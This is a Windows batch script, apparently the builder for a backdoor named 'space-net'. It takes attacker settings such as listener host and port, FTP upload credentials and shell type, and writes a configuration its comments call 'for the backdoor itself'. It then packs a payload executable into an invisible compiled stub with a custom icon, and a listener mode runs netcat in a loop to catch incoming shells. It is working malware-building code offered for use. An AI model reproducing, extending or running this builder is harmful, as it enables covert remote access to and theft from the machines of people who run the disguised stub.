@echo off
:: install spacenet on a computer with automated installation process
:: this subroutine will build a stub that will install spacenet with a standalone
:: file... 
title=spc-auto builder
set stringok=printcol -s "[+] " -f 10 -b 0
set stringoklong=printcol -s "	[+] " -f 10 -b 0
set stringerror=printcol -s "[+] " -f 12 -b 0
set stringwarning=printcol -s "[+] " -f 14 -b 0
:: set all the variables

cd main-setup
echo { >>log.txt
%stringok% && echo loading variables...


:: this is the listener mode...
if "%1"=="listenmode" (
	goto listenmode
	)
	
set maindir=
set payloadir=payload
set settingsdir=settings
set addfiles=additional-files
set meta=meta

:: this is not longer a beta version
REM set msgr=%random%
REM echo [#] warning this is a beta version... >>log.txt
REM echo x=msgbox("Warning: This is a beta version of the script and the installer is in pre-alpha stage.",0+6,"space-net (beta)") >>%temp%\%msgr%.vbs
REM start %temp%\%msgr%.vbs
REM ping localhost -n 3 >nul
REM del %temp%\%msgr%.vbs


:: get all arguments
%stringok% && echo loading arguments...
echo loading parameters... >>log.txt

if NOT EXIST tmp.txt (
	%stringerror% && echo the parameter file is missing...
	%stringerror% && echo compilation aborted...
	set fatalid=MSSNG_PARA
	goto fatal
	)
setlocal enabledelayedexpansion
set Counter=1
:: for /f "usebackq tokens=*" %%a in ("tmp.txt") do call :ReadFileMentions "%%a"
for /f "usebackq tokens=*" %%x in (tmp.txt) do (
  set "Line_!Counter!=%%x"
  set /a Counter+=1
)

set /a NumLines=Counter - 1
for /l %%x in (1,1,%NumLines%) do set %%x=!Line_%%x!\
if %NumLines% lss 14 (
	echo [#] error: check input... >>log.txt
	goto missingparam
	)
	
	
REM 1. lhost
REM 2. lport
REM 3. program
REM 4. uhost
REM 5. uport
REM 6. uuser
REM 7. upass
REM 8. selclas
REM 9. payloadname
REM 10. errorlimit
REM 11. adminmanifest
REM 12. customdir
REM 13. architecture
REM 14. outfile
REM 15. shelloc
REM 16. iconfile		
		

echo [+] first validation passed... >>log.txt
	set lhost=%Line_1%
	set lport=%Line_2%
	set rprog=%Line_3%
	set uphost=%Line_4%
	set uport=%Line_5%
	set uuser=%Line_6%
	set upass=%Line_7%
	set shellt=%Line_8%
	set buildver=%Line_9%
	set errorlimit=%Line_10%
	set adminmanifest=%Line_11%
	set customdir=%Line_12%
	set architecture=%Line_13%
	set output=%Line_14%
	set shelloc=%Line_15%
	set iconfile=%Line_16%
	
	%stringok% && echo cleaning up variables...
	
	set lhost=%lhost:~0,-1%
	set lport=%lport:~0,-1%
	set rprog=%rprog:~0,-1%
	set uphost=%uphost:~0,-1%
	set uport=%uport:~0,-1%
	set uuser=%uuser:~0,-1%
	set upass=%upass:~0,-1%
	set shellt=%shellt:~0,-1%
	set buildver=%buildver:~0,-1%
	set errorlimit=%errorlimit:~0,-1%
	set adminmanifest=%adminmanifest:~0,-1%
	set customdir=%customdir:~0,-1%
	set architecture=%architecture:~0,-1%
	set output=%output:~0,-1%
	set shelloc=%shelloc:~0,-1%
	set iconfile=%iconfile:~0,-1%
	
	%stringok% && echo done housekeeping...
%stringok% && echo checking file parameters...
:: check the icon file...
if "%iconfile%"=="" (
	%stringok% && echo icon file is not specified...
	%stringok% && echo loading default value...
	set iconfile=meta\icons\favicon.ico
	)
if "%shelloc%"=="custom" (
	%stringok% && echo custom directory requested...
	%stringok% && echo changing varible shelloc...
	set shelloc=%customdir%
	)
%stringok% && echo parameters loaded...
:: validating the input...

	
:: check if all the needed files and folders are available
:: save the config to be copied when installed...
:: note that this config file is for the backdoor itself

:: delete the insconfig if it is already loaded...
echo [+] checking if insconfig is loaded... >>log.txt
if exist "settings\insconfig.bat" (
	echo [+] insconfig is already loaded... >>log.txt
	echo [+] deleting insconfig... >>log.txt
	del "settings\insconfig.bat"
)

		echo set lhost=%lhost%>>%settingsdir%\insconfig.bat
		echo set lport=%lport%>>%settingsdir%\insconfig.bat
		echo set uport=%uport%>>%settingsdir%\insconfig.bat
		echo set uhost=%uphost%>>%settingsdir%\insconfig.bat
		echo set prog=%rprog%>>%settingsdir%\insconfig.bat
		echo set shellt=%shellt%>>%settingsdir%\insconfig.bat
		echo set ftpuser=%uuser%>>%settingsdir%\insconfig.bat
		echo set ftppass=%upass%>>%settingsdir%\insconfig.bat
		
		echo [+] config written... >>log.txt
		echo     - lhost : %lhost% >>log.txt
		echo     - lport : %lport% >>log.txt
		echo     - program : %rprog% >>log.txt
		
:: this config segment is for the installer
echo [+] checking if config is loaded... >>log.txt
if exist "settings\config.bat" (
	echo [+] config is already loaded... >>log.txt
	echo [+] deleting config... >>log.txt
	del "settings\config.bat"
)

:: something wrong is going on here...

::		echo set errorlimit=%errorlimit%>>%settingsdir%\insconfig.bat
		echo set shelloc=%shelloc%>>%settingsdir%\insconfig.bat
		echo set logdump=%shelloc%\%buildver%\inslog.log>>%settingsdir%\insconfig.bat
		echo set buildver=%buildver%>>%settingsdir%\insconfig.bat
		echo set insdir=%shelloc%\%buildver%>>%settingsdir%\insconfig.bat
		echo set logdump=debug.txt>>%settingsdir%\insconfig.bat
		
echo [+] checking if the payload is available... >>log.txt
:: checking if the payload is available...
if not exist "%cd%\%payloadir%\%buildver%.exe" (
	echo [+] error... >>log.txt
	echo [+] payload is missing... >>log.txt
	set fatalid=MSSNG_PAYLOAD
	goto fatal
	)
echo [+] payload found... >>log.txt

echo [+] loading packing script... >>log.txt
echo {
	set additional-files=0
	:: check if any assets are needed...
	:: checking additional-files...
	echo 	[+] checking addfiles... >>log.txt
	%stringoklong% && echo  checking addfiles...
	if exist "additional-files\*" (
	echo 	[+] additional-files needed... >>log.txt
	%stringoklong% && echo 	additional-files needed...
		set additional-files=1
	)
	:: making a new directory in the workspace folder...
	set assetload=%random%
	mkdir "workspace\%assetload%" >nul
	::copy "settings\config.bat" "workspace\%assetload%" >nul
	copy "settings\insconfig.bat" "workspace\" >nul
	copy "payload\%buildver%.exe" "workspace\%assetload%" >nul
	copy "essentials\arrange.exe" "workspace" >nul
	copy "essentials\unpack.vbs" "workspace" >nul
	:: all assets are loaded...
	:: pack them in a single zip file...
	ping localhost -n 3 >nul
	%stringoklong% && echo  packing custom files...
	:: powershell Compress-Archive -path "workspace\%assetload%" -DestinationPath "workspace\%assetload%.zip"
	cscript /b pack.vbs "%cd%\workspace\%assetload%" "%cd%\workspace\%assetload%.zip"
	echo 	[+] deleting directory... >>log.txt
	%stringoklong% && echo deleting directory...
	del /Q "workspace\%assetload%\*"
	rmdir "workspace\%assetload%"
	echo set payloads=unpack>>workspace\insconfig.bat
	echo set randex=%assetload%>>workspace\insconfig.bat
	echo 	[+] done... >>log.txt
echo }
%stringok% && echo packing script done...

:: checking if the compiler is available...
if not exist "%meta%\compiler.exe" (
	%stringerror% && echo error...
	%stringerror% && echo compiler is missing...
	%stringerror% && echo press any key to exit...
	set fatalid=MSSNG_COMP
	goto fatal
	)
%stringok% && echo compiler loaded...

:: command line...
if "%architecture%"=="32arch" (
	set architecture=x32
	) else (
	set architecture=x64
	)

REM :: name changing segment...
REM :: so that the end check proccess is ot fooled...
REM :checksavename
REM if exist "../%output%" (
	REM set output=%output%_%random%.exe
	REM ping localhost -n 2 >nul
	REM %stringwarning% && echo Warning : the output has been changed to %output%...
	REM goto checksavename
	REM )

meta\compiler -bat "meta\null.bat" -icon "%iconfile%" -invisible -%architecture% -overwrite -nodelete -temp -include workspace -save "../%output%"
echo [+] the stub has been saved to .../%output% >>log.txt
if exist "../%output%" (
	%stringok% && echo output file saved...
	%stringok% && echo build successful...
	) else (
	%stringerror% && echo something went wrong with the compilation...
	%stringerror% && echo check the log file...
	set fatalid=MSSNG_OUTPT
	goto fatal
	)
ping localhost -n 4 >nul
del /Q "workspace\*"
goto eof

:fatal
set f=%random%
echo x=msgbox("ERROR:%fatalid% - Compilation Failed",0+16,"space-net (beta) ") >>%temp%\%f%.vbs
ping localhost -n 2 >nul
start %temp%\%f%.vbs
echo [#] error: fatal error... >>log.txt
pause >nul
goto eof

:missingparam
echo [#] error: some parameters are missing... >>log.txt
echo [+] quitting... >>log.txt
color 0C
set f=%random%
echo x=msgbox("Please make sure that all inputs have been entered",0+16,"space-net (beta)") >>%temp%\%f%.vbs
start %temp%\%f%.vbs
goto eof

:listenmode
	title = spc-auto listener
	%stringok% && echo entering listening mode...
	set full=%*
	for /f "tokens=2,*" %%a in ("%full%") do set parameters=%%b
	:restartlistener
	essentials\nc -l -p %2 %parameters%
	%stringerror% && echo connection lost...
	ping localhost -n 3 >nul
	%stringok% && echo press any key to restart listening instance...
	pause >nul
	%stringok% && echo restarting listening instance...
	goto restartlistener
	
:eof
echo } >>log.txt
ping localhost -n 2 >nul













